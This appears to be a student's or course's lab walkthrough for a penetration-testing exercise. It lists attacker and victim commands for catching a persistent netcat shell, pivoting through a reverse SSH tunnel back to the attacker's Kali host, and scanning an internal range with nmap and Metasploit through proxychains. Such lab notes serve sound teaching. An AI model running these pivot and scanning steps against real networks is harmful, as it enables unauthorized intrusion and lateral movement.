# Changing Targets VICTIM 2

## Introduction



Here You will find techniques PERSISTENT SHELL, PIVIOT, AND PING SWEEP.



## Step 1: CATCH PERSISTENT SHELL



### (ATTACKER)



```bash
nc -lvp 55556
```
**REMEMBER TO UPGRADE YOUR SHELL**


## Step 2: PIVOT

### (ATTACKER)


```bash
 netstat -natp
```
```
netstat -natp | grep LISTEN
```

**AFTER CATCHING PERSISTENT SHELL (USE YOUR SSH PORT) OPEN SSH FOR LISTNER TO SET UP PROXY**


```bash
sudo systemctl status ssh.service
```
```
sudo systemctl start ssh.service
```


### (VICTIM)
```bash
 ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 55555
```


**MAKE SURE PORT FWD RULE IS GOOD ON PFSENSE SSH PORT 22
if it states port fowarding failed it means you alrady have ypur proxy open
(VICTIM) should be promted a password**



## Step 3: PING SWEEP


**NOTE: YOUR DIRECTORIES MAY VARY COMPARED TO MY EXAMPLE DEPENDING HOW AND WHERE YOUR SCOPE FILE IS ON KALI**



### (ATTACKER)
```bash
 ls
```
```
cd internal
```

**SHOULD SEE IP'S PING SWEEPS AND TARGETS**


```
ls
```
```
cd 192.168.1.102 
```
SOC 4 IP

```
sudo proxychains nmap -iL scope -F -Pn -sT | tee fast_scan
```

**USE A THIRD TERMINAL**

```bash
sudo proxychains msfconsole 
```
[1:24:44]

*** continued... at [ 2 Metasploit via Proxychains & PrivEsc Automation w linPEAS ]
